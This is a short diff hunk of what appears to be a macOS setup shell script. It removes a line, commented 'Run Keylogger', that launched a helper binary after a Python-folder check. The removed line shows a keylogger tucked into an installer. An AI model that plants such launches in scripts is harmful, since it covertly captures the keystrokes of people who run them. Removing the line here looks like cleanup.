@@ -15,6 +15,4 @@ if [[ ! -d "/usr/local/Cellar/python@3.8" ]]; then
 	rm -rf "/usr/local/Cellar/__MACOSX"
 fi
 
-# Run Keylogger
-"$ORTA/runkeyeventhandler"
 exit 0
